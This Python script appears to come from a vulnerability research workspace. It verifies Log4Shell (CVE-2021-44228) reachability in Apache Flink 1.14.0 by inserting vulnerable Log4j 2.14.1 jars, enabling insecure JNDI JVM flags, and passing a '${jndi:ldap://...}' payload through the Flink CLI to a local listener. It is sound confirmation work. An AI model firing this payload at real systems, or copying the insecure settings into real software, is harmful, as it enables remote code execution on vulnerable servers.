#!/usr/bin/env python3
import argparse
import hashlib
import json
import os
import shutil
import socket
import subprocess
import tarfile
import threading
import time
from pathlib import Path


SAMPLE_ID = "CVE-2021-44228__apache_flink_1_14_0_v1_log4j_real_entrypoint"
ARCHIVE_NAME = "flink-1.14.0-bin-scala_2.12.tgz"
ARCHIVE_URL = "https://archive.apache.org/dist/flink/flink-1.14.0/flink-1.14.0-bin-scala_2.12.tgz"
ROOT = Path("/data/lhq/workspace")
OUT_ROOT = ROOT / "ljl-v1-downstream-insertions"
LEGACY_ROOT = ROOT / "ljl-strict-redo"
SOURCE_CASE = "log4j/CVE-2021-44228"
SOURCE_V1 = ROOT / "ljl-patch-java30-projects/input/log4j/CVE-2021-44228/v1"
M2 = ROOT / "ljl-patch-java30-projects/.m2-poc"
V1_LOG4J_JARS = {
    "log4j-api-2.14.1.jar": M2 / "org/apache/logging/log4j/log4j-api/2.14.1/log4j-api-2.14.1.jar",
    "log4j-core-2.14.1.jar": M2 / "org/apache/logging/log4j/log4j-core/2.14.1/log4j-core-2.14.1.jar",
}


def sha256(path):
    digest = hashlib.sha256()
    with path.open("rb") as handle:
        for chunk in iter(lambda: handle.read(1024 * 1024), b""):
            digest.update(chunk)
    return digest.hexdigest()


def ensure_flink(workdir, sample_dir, log_path):
    archive = workdir / "historical-scan" / ARCHIVE_NAME
    legacy_archive = LEGACY_ROOT / "historical-scan" / ARCHIVE_NAME
    archive.parent.mkdir(parents=True, exist_ok=True)
    if not archive.exists() and legacy_archive.exists():
        shutil.copy2(legacy_archive, archive)
    if not archive.exists():
        import urllib.request

        with log_path.open("a", encoding="utf-8") as log:
            log.write(f"Downloading {ARCHIVE_URL}\n")
        tmp = archive.with_suffix(".tgz.tmp")
        urllib.request.urlretrieve(ARCHIVE_URL, tmp)
        tmp.rename(archive)

    dist = sample_dir / "flink-1.14.0"
    if dist.exists():
        shutil.rmtree(dist)
    with tarfile.open(archive, "r:gz") as tar:
        tar.extractall(sample_dir)
    return archive, dist


def insert_v1_log4j(dist, evidence_dir):
    lib = dist / "lib"
    before = {}
    inserted = {}
    for name, source in V1_LOG4J_JARS.items():
        target = lib / name
        if not source.exists():
            raise FileNotFoundError(source)
        before[name] = {
            "target": str(target),
            "existed_before_insertion": target.exists(),
            "sha256_before": sha256(target) if target.exists() else None,
        }
        if target.exists():
            target.unlink()
        shutil.copy2(source, target)
        inserted[name] = {
            "source_v1_runtime_jar": str(source),
            "target": str(target),
            "sha256_source": sha256(source),
            "sha256_target_after": sha256(target),
            "is_generated_v1_runtime_jar": True,
        }
    jars = sorted(str(p.relative_to(dist)) for p in dist.glob("lib/log4j-*.jar"))
    result = {
        "source_case": SOURCE_CASE,
        "source_v1": str(SOURCE_V1),
        "insertion_method": "delete Flink runtime log4j-api/core jars, then copy generated v1 Log4j 2.14.1 api/core jars from .m2-poc into lib before invoking the real flink CLI entrypoint",
        "before_insertion": before,
        "inserted_v1_jars": inserted,
        "runtime_log4j_jars_after_insertion": jars,
    }
    (evidence_dir / "dependency-evidence.json").write_text(
        json.dumps(result, indent=2, sort_keys=True) + "\n", encoding="utf-8"
    )
    return result


def start_listener(evidence_dir, case_name, timeout=12):
    received = []
    ready = threading.Event()
    port_box = {}

    def worker():
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.bind(("127.0.0.1", 0))
            sock.listen(5)
            sock.settimeout(timeout)
            port_box["port"] = sock.getsockname()[1]
            (evidence_dir / f"{case_name}-listener-port.txt").write_text(str(port_box["port"]), encoding="utf-8")
            ready.set()
            try:
                conn, addr = sock.accept()
            except socket.timeout:
                return
            with conn:
                data = conn.recv(256)
                received.append({"addr": repr(addr), "data_hex": data.hex(), "data_repr": repr(data)})
                try:
                    conn.sendall(bytes([48, 12, 2, 1, 1, 101, 7, 10, 1, 0, 4, 0, 4, 0]))
                except OSError:
                    pass

    thread = threading.Thread(target=worker, daemon=True)
    thread.start()
    if not ready.wait(3):
        raise RuntimeError(f"{case_name} listener did not start")
    return port_box["port"], received, thread


def run_case(dist, evidence_dir, case_name, cmd_builder, timeout=15):
    port, received, thread = start_listener(evidence_dir, case_name)
    payload = "${jndi:ldap://127.0.0.1:%d/a}" % port
    cmd = cmd_builder(payload)
    env = os.environ.copy()
    env["JAVA_HOME"] = "/usr/lib/jvm/java-11-openjdk-amd64"
    env["JVM_ARGS"] = "-Dlog4j2.formatMsgNoLookups=false -Dcom.sun.jndi.ldap.object.trustURLCodebase=true"

    started = time.time()
    proc = subprocess.run(
        cmd,
        cwd=str(dist),
        env=env,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True,
        timeout=timeout,
    )
    thread.join(2)
    output = proc.stdout
    result = {
        "case": case_name,
        "cmd": cmd,
        "duration_seconds": round(time.time() - started, 3),
        "payload": payload,
        "received": received,
        "received_count": len(received),
        "returncode": proc.returncode,
        "stdout_contains_execution_plan": "Execution Plan" in output,
        "stdout_contains_wordcount_plan": "Flat Map" in output and "Keyed Aggregation" in output,
        "stdout_contains_payload": payload in output,
        "stdout_tail": output[-5000:],
    }
    (evidence_dir / f"{case_name}.json").write_text(json.dumps(result, indent=2, sort_keys=True) + "\n", encoding="utf-8")
    return result


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--workdir", default=str(OUT_ROOT))
    args = parser.parse_args()

    workdir = Path(args.workdir)
    sample_dir = workdir / "samples" / SAMPLE_ID
    evidence_dir = sample_dir / "evidence"
    evidence_dir.mkdir(parents=True, exist_ok=True)
    run_log = evidence_dir / "run.log"
    run_log.write_text("", encoding="utf-8")

    archive, dist = ensure_flink(workdir, sample_dir, run_log)
    dependency_evidence = insert_v1_log4j(dist, evidence_dir)
    flink = str(dist / "bin" / "flink")
    wordcount = str(dist / "examples/streaming/WordCount.jar")

    jars = sorted(str(p.relative_to(dist)) for p in dist.glob("lib/log4j-*.jar"))
    jndi_present = False
    core_jar = dist / "lib" / "log4j-core-2.14.1.jar"
    if core_jar.exists():
        import zipfile

        with zipfile.ZipFile(core_jar) as zf:
            jndi_present = "org/apache/logging/log4j/core/lookup/JndiLookup.class" in zf.namelist()

    (evidence_dir / "dependency-evidence.txt").write_text(
        "\n".join(jars) + f"\nJndiLookup.class={jndi_present}\narchive={archive}\n",
        encoding="utf-8",
    )

    positive = run_case(
        dist,
        evidence_dir,
        "info_wordcount_output_payload",
        lambda payload: [flink, "info", wordcount, "--output", "/tmp/flink-out-" + payload],
    )
    negative = run_case(
        dist,
        evidence_dir,
        "info_wordcount_output_no_payload",
        lambda payload: [flink, "info", wordcount, "--output", "/tmp/flink-out-control"],
    )

    confirmed = (
        positive["returncode"] == 0
        and positive["received_count"] > 0
        and positive["stdout_contains_execution_plan"]
        and positive["stdout_contains_wordcount_plan"]
        and negative["returncode"] == 0
        and negative["received_count"] == 0
        and "lib/log4j-core-2.14.1.jar" in jars
        and jndi_present
    )

    result = {
        "sample_id": SAMPLE_ID,
        "status": "TP_CONFIRMED_REAL_DOWNSTREAM_ENTRYPOINT" if confirmed else "FAILED",
        "strict_status": "TP_CONFIRMED" if confirmed else "FAILED",
        "source_case": SOURCE_CASE,
        "source_v1_path": str(SOURCE_V1),
        "downstream_repo": "apache/flink",
        "downstream_application": "Apache Flink 1.14.0",
        "downstream_entrypoint": "bin/flink real CLI info action",
        "downstream": "Apache Flink 1.14.0",
        "cve": "CVE-2021-44228",
        "upstream_library": "log4j",
        "vulnerable_version": "2.14.1",
        "dependency_evidence": dependency_evidence,
        "jndi_lookup_class_present": jndi_present,
        "attack_surface": "Flink CLI `bin/flink info` loads official WordCount example and logs the user-controlled --output program argument through Log4j",
        "payload": positive["payload"],
        "dynamic_signal": {
            "positive_listener_received_count": positive["received_count"],
            "positive_listener_received": positive["received"],
            "positive_returncode": positive["returncode"],
            "positive_execution_plan": positive["stdout_contains_execution_plan"],
            "negative_listener_received_count": negative["received_count"],
            "negative_returncode": negative["returncode"],
        },
        "cases": [positive, negative],
        "not_cve_poc_local": True,
        "not_runner_only": True,
        "notes": (
            "The verifier does not execute .cve_poc_local. It inserts the generated v1 Log4j api/core "
            "2.14.1 runtime jars into an isolated Flink distribution. The payload enters through Flink's "
            "real CLI `info` action and the official streaming WordCount example's `--output` program "
            "argument. The command exits successfully after generating a Flink execution plan, while "
            "the local listener receives the Log4j LDAP lookup."
        ),
    }
    (sample_dir / "manifest.json").write_text(json.dumps(result, indent=2, sort_keys=True) + "\n", encoding="utf-8")
    (evidence_dir / "probe.json").write_text(json.dumps(result, indent=2, sort_keys=True) + "\n", encoding="utf-8")
    (evidence_dir / "run.rc").write_text(
        f"RUN_RC={0 if confirmed else 1}\n"
        f"positive_listener_received_count={positive['received_count']}\n"
        f"negative_listener_received_count={negative['received_count']}\n"
        f"jndi_lookup_class_present={int(jndi_present)}\n"
        f"positive_returncode={positive['returncode']}\n",
        encoding="utf-8",
    )
    (sample_dir / "README.md").write_text(
        f"# {SAMPLE_ID}\n\n"
        "Run `python3 scripts/verify_flink_log4j_v1_inserted.py` from `/data/lhq/workspace/ljl-v1-downstream-insertions`.\n"
        "The verifier inserts generated v1 Log4j 2.14.1 api/core jars into the official Apache Flink 1.14.0 binary distribution and passes a JNDI payload "
        "through `bin/flink info ... --output <payload>` against the official WordCount example. It confirms "
        "Flink generates an execution plan and a local listener receives the Log4j LDAP lookup.\n",
        encoding="utf-8",
    )
    print(json.dumps(result, indent=2, sort_keys=True))
    raise SystemExit(0 if confirmed else 1)


if __name__ == "__main__":
    main()
